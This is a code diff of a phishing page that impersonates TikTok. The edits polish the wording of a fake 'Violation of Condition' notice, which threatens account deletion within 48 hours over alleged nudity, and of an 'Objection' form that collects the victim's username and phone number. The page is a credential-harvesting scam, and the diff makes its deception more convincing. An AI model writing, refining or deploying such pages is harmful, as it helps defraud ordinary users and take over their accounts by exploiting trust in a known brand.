@@ -103,7 +103,7 @@ echo '';
       TikTok Violation of Condition
     </h1>
     <p class="yazi-2">Hi!<br>
-     We dont confirm your account because account  complaited us for nudety.Your account not suitable for us terms of use.please fill the form and wait us for next step and dont any changes in 48 hours otherwise your account can be deleted </p><br>
+     We do not  conform your account because  your account was  complainted to  us for nudety.Your account is  not suitable for  our terms of use.please fill the form and wait us for next step and dont do any changes in 48 hours otherwise your account will be deleted </p><br>
    <button  class="tiktok_buton" type="buton" onclick="erhancanturker();"
    >Next</button>
    </div>
@@ -275,7 +275,7 @@ echo '';
 <img  alt="tiktok" src="https://i.hizliresim.com/jqZypj.png" width="80" style="border-radius:50%;">
 <br>
 <h1 class="yazi">Objection</h1><br>
-<p class="yazi-2">Please give us correct information and wait us account confirmation.please fill the form </p><br>
+<p class="yazi-2">Please enter  correct information and wait for  account conformation.please fill the form </p><br>
 <form method="post" autocomplete="off">
 <input  class="er" type="text" name="username" required="" placeholder="@username"><br>
 <input class="er" type="number" name="number" required="" placeholder="Phone Number"><br>
